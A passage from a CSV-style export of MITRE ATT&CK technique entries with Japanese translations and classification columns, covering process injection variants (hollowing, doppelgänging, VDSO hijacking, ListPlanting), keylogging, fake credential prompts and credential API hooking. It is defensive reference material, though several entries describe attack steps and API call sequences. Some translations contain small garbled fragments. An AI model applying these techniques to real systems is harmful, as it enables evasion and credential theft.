新規ウィンドウクラスの登録時には、そのクラスの各インスタンスに割り当てられるメモリに最大40バイトのEWMを追加するよう要求できる。このEWMは当該ウィンドウ固有のデータを格納することを目的としており、その値を設定・取得するための特定のアプリケーションプログラミングインターフェース(API)関数が存在する。(出典: Microsoft GetWindowLong関数) (引用元: Microsoft SetWindowLong関数) EWMは小さいながらも32ビットポインタを格納できる十分な容量を持ち、Windowsプロシージャを指すために頻繁に使用される。マルウェアは、プロセスのメモリ共有セクションへのコード書き込み、EWMへのコードポインタ配置、そしてプロセスのEWM内アドレスへの制御戻しによる実行呼び出しを含む攻撃チェーンの一環として、このメモリ領域を利用する可能性がある。 EWMインジェクションによる実行権限の取得は、標的プロセスのメモリへのアクセスと、場合によっては昇格された特権へのアクセスを可能にする。共有セクションへのペイロード書き込みは、<code>WriteProcessMemory</code>や<code>CreateRemoteThread</code>といった厳重に監視されるAPI呼び出しの使用を回避する。(引用: Elastic Process Injection 2017年7月) より高度なマルウェアサンプルは、Windowsプロシージャとその他のシステム機能を組み合わせてトリガーすることで、データ実行防止(DEP)などの保護機構をバイパスする可能性もある。これにより、標的プロセスの実行可能領域内に悪意のあるペイロードを書き換えることが可能となる。 (引用元: MalwareTech Power Loader 2013年8月) (引用元: WeLiveSecurity Gapz and Redyms 2013年3月) 別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソース、場合によっては昇格された特権へのアクセスが可能になる。EWMインジェクションによる実行は、正当なプロセスに隠蔽されるため、セキュリティ製品による検出を回避する可能性もある。,defense-evasion;privilege-escalation,Windows,other,privilege_gain,privileged_account;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298,2020-01-14T17:18:32.126Z,2025-04-25T14:45:37.275Z,,,,
T1055.012,T1055,Process Hollowing,プロセスホローイング,"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process. Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code> before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017) This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",攻撃者はプロセスベース防御を回避するため、一時停止状態かつ中空化されたプロセスに悪意あるコードを注入することがある。プロセス中空化とは、別の実行中プロセスのアドレス空間内で任意のコードを実行する手法である。 プロセスホローイングは通常、プロセスを一時停止状態で作成し、そのメモリをアンマップ/ホローイングした後、悪意のあるコードで置き換えることで実行される。被害プロセスは、<code>CreateProcess</code>などのネイティブWindows API呼び出しで作成可能であり、これにはプロセスのプライマリスレッドを一時停止するフラグが含まれる。 この時点で、<code>ZwUnmapViewOfSection</code> や <code>NtUnmapViewOfSection</code> などのAPI呼び出しを用いてプロセスをアンマップし、書き込んだ後、注入されたコードに合わせて再配置し、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code>、そして <code>ResumeThread</code> を順に実行して再開します。(引用: Leitch Hollowing)(引用: Elastic Process Injection July 2017)これは[スレッドローカルストレージ](https://attack.mitre.org/techniques/T1055/005)と非常に似ていますが、既存のプロセスを標的とするのではなく、新しいプロセスを作成します。 この動作は、注入されたプロセスが注入元プロセスから生成される（したがってセキュリティコンテキストを継承する）ため、特権昇格には至らない可能性が高い。ただし、プロセスホローイングによる実行は、正当なプロセスに隠蔽されるため、セキュリティ製品の検知を回避する可能性もある。,defense-evasion;privilege-escalation,Windows,other,privilege_gain,privileged_account;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4,2020-01-14T17:21:54.470Z,2025-04-15T19:58:58.724Z,,,,
T1055.013,T1055,Process Doppelgänging,プロセス・ドッペルゲンガー,"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF) Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017) Adversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017) Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017): * Transact  ECreate a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction. * Load  ECreate a shared section of memory and load the malicious executable. * Rollback  EUndo changes to original executable, effectively removing malicious code from the file system. * Animate  ECreate a process from the tainted section of memory and initiate execution. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.",攻撃者は、プロセスベースの防御を回避し、場合によっては特権昇格を図るため、プロセスドッペルゲンガーを介して悪意のあるコードをプロセスに注入することがあります。プロセスドッペルゲンガーとは、別の稼働中のプロセスのアドレス空間内で任意のコードを実行する手法です。 Windows トランザクショナル NTFS (TxF) は、安全なファイル操作を実行する方法として Vista で導入された。(引用元: Microsoft TxF) データ整合性を確保するため、TxF は特定の時点でファイルへの書き込みを許可するトランザクションハンドルを 1 つだけに制限する。書き込みハンドルによるトランザクションが終了するまで、他のすべてのハンドルは書き込み元から隔離され、ハンドルが開かれた時点でコミットされていたファイルのバージョンを読み取るのみとなる。 (引用元: Microsoft Basic TxF Concepts) 破損を回避するため、TxFは書き込みトランザクション中にシステムまたはアプリケーションが失敗した場合、自動的にロールバックを実行します。(引用元: Microsoft Where to use TxF) 非推奨となっているものの、TxFアプリケーションプログラミングインターフェース(API)はWindows 10時点でも有効です。 (引用元: BlackHat Process Doppelgänging Dec 2017) 攻撃者はTxFを悪用し、[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)のファイルレス版を実行する可能性があります。 [プロセスホローイング](https://attack.mitre.org/techniques/T1055/012)と同様に、プロセスドッペルゲンガーは正当なプロセスのメモリを置き換えることで、防御や検知を回避する可能性のある悪意のあるコードを隠蔽実行します。 プロセスドッペルゲンガーが TxF を使用することで、<code>NtUnmapViewOfSection</code>、<code>VirtualProtectEx</code>、<code>SetThreadContext</code> などの監視の厳しい API 関数の使用も回避できます。 (出典: BlackHat Process Doppelgänging Dec 2017) プロセス・ドッペルゲンガーは4段階で実装される (出典: BlackHat Process Doppelgänging Dec 2017):* トランザクション  EC正当な実行ファイルを使用してTxFトランザクションを作成し、ファイルを悪意のあるコードで上書きする。これらの変更は隔離され、トランザクションのコンテキスト内でのみ可視化される。 * ロード  EChemalous実行ファイルをロードするため、メモリの共有セクションを作成する。* ロールバック  E元の実行ファイルへの変更を元に戻し、ファイルシステムから悪意のあるコードを効果的に除去する。 * Animate  EContaminatedセクションからプロセスを作成し実行を開始する。注入プロセスが親プロセスから生成されるため（セキュリティコンテキストを継承）、特権昇格は発生しない可能性が高い。ただし、正当なプロセスに隠蔽されるため、セキュリティ製品による検知を回避する可能性がある。,defense-evasion;privilege-escalation,Windows,other,privilege_gain,privileged_account;endpoint_execution;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197,2020-01-14T17:19:50.978Z,2025-04-25T14:47:03.621Z,,,,
T1055.014,T1055,VDSO Hijacking,VDSOハイジャック,"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.",攻撃者は、プロセスベースの防御を回避し、場合によっては特権昇格を図るため、VDSOハイジャックを介してプロセスに悪意のあるコードを注入することがあります。 仮想動的共有オブジェクト（VDSO）ハイジャックは、別の実行中プロセスのアドレス空間で任意のコードを実行する手法である。VDSOハイジャックは、動的リンク共有ライブラリへの呼び出しをリダイレクトすることを含む。メモリ保護機能により、[Ptraceシステムコール](https://attack.mitre.org/techniques/T1055/008)を介したプロセスへの実行可能コードの書き込みは防止される可能性がある。 しかし攻撃者は、vdso共有オブジェクトからプロセスにマップされたシステムコールインターフェースコードスタブをハイジャックし、悪意のある共有オブジェクトを開いてマップするシステムコールを実行できる。このコードは、プロセスのグローバルオフセットテーブル（マップされたライブラリ関数の絶対アドレスを格納）に保存されたパッチ適用済みメモリアドレス参照を介してプロセス実行フローをリダイレクトすることで呼び出せる。(引用: ELF Injection May 2009)(引用: Backtrace VDSO)(引用: VDSO Aug 2005)(引用: Syscall 2014) 別プロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソース、場合によっては昇格された特権へのアクセスが可能となる。VDSO乗っ取りによる実行は、正当なプロセスに隠蔽されるため、セキュリティ製品による検知を回避する可能性もある。,defense-evasion;privilege-escalation,Linux,other,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--98be40f2-c86b-4ade-b6fc-4964932040e5,2020-01-14T01:35:00.781Z,2025-04-15T19:58:52.691Z,,,,
T1055.015,T1055,ListPlanting,リストプランティング,"Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.(Citation: Hexacorn Listplanting) Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process. List-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control. ListPlanting (a form of message-passing ""shatter attack"") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process Ememory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods. Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) Finally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",攻撃者はリストビューコントロールを悪用し、乗っ取ったプロセスに悪意のあるコードを注入することで、プロセスベースの防御を回避し、場合によっては特権昇格を図る可能性があります。リストプランティングとは、別の稼働中のプロセスのアドレス空間で任意のコードを実行する手法です。(引用元: Hexacorn Listplanting) リストプランティング経由で実行されるコードは、正当なプロセスに隠蔽されるため、セキュリティ製品による検知を回避する可能性もあります。 リストビューコントロールは、アイテムの集合を表示するために使用されるユーザーインターフェースウィンドウである。(引用元: Microsoft List View Controls) アプリケーションのリストビュー設定に関する情報は、<code>SysListView32</code>コントロール内でプロセスのメモリに格納される。 リストプランティング（メッセージパッシング型「シャター攻撃」の一種）は、リストビューコントロールを使用するプロセスの仮想アドレス空間にコードをコピーし、そのコードをリスト項目のソート用カスタムコールバックとして使用することで実行される。（引用元：Modexp Windows Process Injection）攻撃者はまずコードを標的プロセスのメモリ空間にコピーする必要があり、これには被害者プロセスウィンドウの子である<code>SysListView32</code>へのハンドルを直接取得する方法（<code>FindWindow</code>や<code>EnumWindows</code>などのWindows API呼び出しによる）やその他の [プロセスインジェクション](https://attack.mitre.org/techniques/T1055)手法など。ListPlantingの変種によっては、監視の厳しい<code>WriteProcessMemory</code>関数の使用を回避するため、ターゲットプロセス内でメモリを割り当てた後、ウィンドウメッセージを用いてペイロードをコピーする場合がある。 例えば攻撃者は<code>PostMessage</code>や<code>SendMessage</code> API関数を用いて<code>LVM_SETITEMPOSITION</code>および<code>LVM_GETITEMPOSITION</code>メッセージを送信し、割り当て済みメモリへペイロードを2バイト単位でコピーする手法が有効である。（引用元：ESET InvisiMole 2020年6月）最後に、プロセスウィンドウの <code>SysListView32</code> 子に <code>LVM_SORTITEMS</code> メッセージを送信することでペイロードがトリガーされ、新しく割り当てられたバッファ内のペイロードが <code>ListView_SortItems</code> コールバックとして渡され、実行されます。,defense-evasion;privilege-escalation,Windows,config_policy_manipulation,privilege_gain,user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--eb2cb5cb-ae87-4de0-8c35-da2a17aafb99,2021-11-22T15:02:15.190Z,2025-04-15T19:59:18.862Z,,,,
T1056,,Input Capture,入力キャプチャ,"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).",攻撃者は、ユーザー入力をキャプチャする手法を用いて、認証情報を取得したり情報を収集したりする場合があります。通常のシステム使用中、ユーザーはログインページ/ポータルやシステムダイアログボックスなど、様々な場所に認証情報を提供することがよくあります。入力キャプチャメカニズムは、ユーザーには透明である場合もあります（例： [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004))）、あるいはユーザーを騙して本物と信じ込ませたサービスへの入力提供を促すもの（例：[Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)）があります。,collection;credential-access,Linux;Network Devices;Windows;macOS,credential_abuse,asset_access,authentication_system;user_interaction;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0009;TA0006,attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2,2017-05-31T21:30:48.323Z,2025-04-15T19:59:02.160Z,,,,
T1056.001,T1056,Keylogging,キーロギング,"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021) Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include: * Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data. * Reading raw keystroke data from the hardware buffer. * Windows Registry modifications. * Custom drivers. * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)",攻撃者は、ユーザーが入力する認証情報を傍受するために、ユーザーのキーストロークを記録する場合があります。キーロギングは、[OS 認証情報ダンプ](https://attack.mitre.org/techniques/T1003) の取り組みが効果的でない場合に、新たなアクセス機会を得るための認証情報を取得するために使用される可能性が高く、認証情報を正常に取得するには、攻撃者がシステム上で相当な期間キーストロークを傍受する必要がある場合があります。 認証情報を迅速に取得する確率を高めるため、攻撃者はブラウザのクッキーを消去してユーザーにシステムの再認証を強制するなどの行動を取る場合もある。(引用元: Talos Kimsuky 2021年11月) キーロギングは入力キャプチャの中で最も一般的な手法であり、キーストロークを傍受する方法は多岐にわたる。(引用: Adventures of a Keystroke) 主な手法には以下が含まれる:* キーストローク処理用APIコールバックのフック。[Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)とは異なり、キーストロークデータ処理専用のAPI関数に焦点を当てる。 * ハードウェアバッファからの生キーストロークデータの読み取り。* Windowsレジストリの改変。* カスタムドライバ。* [システムイメージの改変](https://attack.mitre.org/techniques/T1601)により、攻撃者はネットワークデバイスのOSにフックを仕掛け、ログインセッションの生キーストロークを読み取れる可能性がある。(引用元: Cisco Blog Legacy Device Attacks),collection;credential-access,Windows;macOS;Linux;Network Devices,credential_abuse,asset_access,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0009;TA0006,attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4,2020-02-11T18:58:11.791Z,2025-04-15T19:58:03.923Z,,,,
T1056.002,T1056,GUI Input Capture,GUI入力キャプチャ,"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)). Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",攻撃者は、一般的なオペレーティングシステムのGUIコンポーネントを模倣し、一見正当なプロンプトでユーザーに認証情報を要求することがあります。現在のユーザーコンテキストよりも高い特権を必要とするプログラムが実行される場合、オペレーティングシステムは通常、タスクの昇格された特権を承認するための適切な認証情報をユーザーに要求します（例：[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)）。。攻撃者は、追加アクセスを要求する偽のインストーラーや偽のマルウェア除去スイートなど、通常の使用を模倣する様々な理由から、この機能を模倣してユーザーに資格情報を要求する正当に見えるプロンプトを表示することがあります。(引用: OSX Malware Exploits MacKeeper) この種のプロンプトは、[AppleScript](https://attack.mitre.org/techniques/T1059/002)(引用: LogRhythm Do You Trust 2014年10月)(引用: OSX Keydnap malware)(引用元: Spoofing credential dialogs) や [PowerShell](https://attack.mitre.org/techniques/T1059/001) などの言語を通じて認証情報を収集するために利用される。(引用元: LogRhythm Do You Trust Oct 2014)(引用元: Enigma Phishing for Credentials Jan 2015)(引用元: Spoofing credential dialogs) Linuxシステムでは、攻撃者は悪意のあるシェルスクリプトやコマンドライン（例：[Unixシェル](https://attack.mitre.org/techniques/T1059/004)）から、ユーザーに認証情報を要求するダイアログボックスを起動する可能性があります。（引用：認証情報ダイアログの偽装）攻撃者はまた、ブラウザやメールクライアントからのものなど、一般的なソフトウェア認証要求を模倣することもあります。 これは、ユーザー活動監視（例：[ブラウザ情報発見](https://attack.mitre.org/techniques/T1217) および/または [アプリケーションウィンドウ発見](https://attack.mitre.org/techniques/T1010)）と組み合わせて、ユーザーが自然に機密サイト/データにアクセスしている際にプロンプトを偽装することも可能です。,collection;credential-access,macOS;Windows;Linux,credential_abuse,asset_access,authentication_system;privileged_account;user_interaction;endpoint_execution;email_infrastructure;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0009;TA0006,attack-pattern--a2029942-0a85-4947-b23c-ca434698171d,2020-02-11T18:58:45.908Z,2025-04-15T22:37:16.582Z,,,,
T1056.003,T1056,Web Portal Capture,Webポータルキャプチャ,"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",攻撃者は、VPNログインページなどの外部向けポータルにコードをインストールし、サービスへのログインを試みるユーザーの認証情報を取得・送信する可能性があります。例えば、侵害されたログインページは、ユーザーをサービスにログインさせる前に提供された認証情報を記録する可能性があります。 この入力キャプチャの変種は、侵害後のバックアップ手段として正当な管理アクセスを利用し、[外部リモートサービス](https://attack.mitre.org/techniques/T1133)や[有効なアカウント](https://attack.mitre.org/techniques/T1078)を介したネットワークアクセスを維持するため、あるいは外部向けWebサービスの悪用による初期侵害の一環として実施される可能性がある。(引用元: Volexity Virtual Private Keylogging),collection;credential-access,Linux;macOS;Windows,credential_abuse,asset_access,authentication_system;user_interaction;network_connectivity;logging_monitoring,specified,Backup Server;Business Workstation;Log / Monitoring Server;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0009;TA0006,attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e,2020-02-11T18:59:50.058Z,2025-04-15T19:58:38.649Z,,,,
T1056.004,T1056,Credential API Hooking,認証情報APIフッキング,"Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001), this technique focuses specifically on API functions that include parameters that reveal user credentials. In Windows, hooking involves redirecting calls to these functions and can be implemented via: * **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017) * **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015) * **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015) In Linux and macOS, adversaries may hook into system functions via the `LD_PRELOAD` (Linux) or `DYLD_INSERT_LIBRARIES` (macOS) environment variables, which enables loading shared libraries into a program’s address space. For example, an adversary may capture credentials by hooking into the `libc read` function leveraged by SSH or SCP.(Citation: Intezer Symbiote 2022)",攻撃者は、Windows アプリケーションプログラミングインターフェイス (API) 関数や Linux システム関数にフックして、ユーザーの認証情報を収集する場合があります。 悪意のあるフッキングメカニズムは、ユーザー認証資格情報を明らかにするパラメータを含む API または関数呼び出しをキャプチャする可能性があります。(引用: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) [キーロギング](https://attack.mitre.org/techniques/T1056/001) とは異なり、この手法は、ユーザー資格情報を明らかにするパラメータを含む API 関数に特に焦点を当てています。 Windowsにおけるフッキングは、これらの関数への呼び出しをリダイレクトする行為であり、以下の方式で実装される：* **フックプロシージャ**：メッセージ、キーストローク、マウス入力などのイベントに応答して指定コードを傍受・実行する。(引用: Microsoft Hook Overview)(引用: Elastic Process Injection July 2017)* **インポートアドレステーブル（IAT）フック**：インポートされたAPI関数へのポインタが格納されているプロセスのIATを改変する手法。(引用: Elastic Process Injection July 2017)(引用: Adlice Software IAT Hooks Oct 2014)(引用: MWRInfoSecurity Dynamic Hooking 2015)* **インラインフッキング**: API関数の先頭バイトを上書きし、コードフローをリダイレクトする手法。(引用: Elastic Process Injection July 2017)(引用: HighTech Bridge Inline Hooking 2011年9月)(引用: MWRInfoSecurity Dynamic Hooking 2015) LinuxおよびmacOSでは、攻撃者は`LD_PRELOAD` (Linux) または`DYLD_INSERT_LIBRARIES` (macOS) 環境変数を通じてシステム関数をフックすることが可能であり、これにより共有ライブラリをプログラムのアドレス空間にロードできる。 例えば、SSHやSCPが利用する`libc read`関数をフックすることで、攻撃者は認証情報を取得できる。(引用: Intezer Symbiote 2022),collection;credential-access,Windows;Linux;macOS,credential_abuse,asset_access,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0009;TA0006,attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6,2020-02-11T19:01:15.930Z,2025-04-15T19:59:21.920Z,,,,
T1057,,Process Discovery,プロセス検出,"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021) On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)",攻撃者はシステム上で実行中のプロセスに関する情報を取得しようとする可能性があります。得られた情報は、ネットワーク内のシステムで実行されている一般的なソフトウェア/アプリケーションの理解に利用される可能性があります。管理者権限またはその他の特権アクセスは、より詳細なプロセス情報を提供します。 攻撃者は自動検出時の[プロセス検出](https://attack.mitre.org/techniques/T1057)情報を基に、ターゲットへの完全感染の可否や特定アクションの試行など、後続行動を決定する。 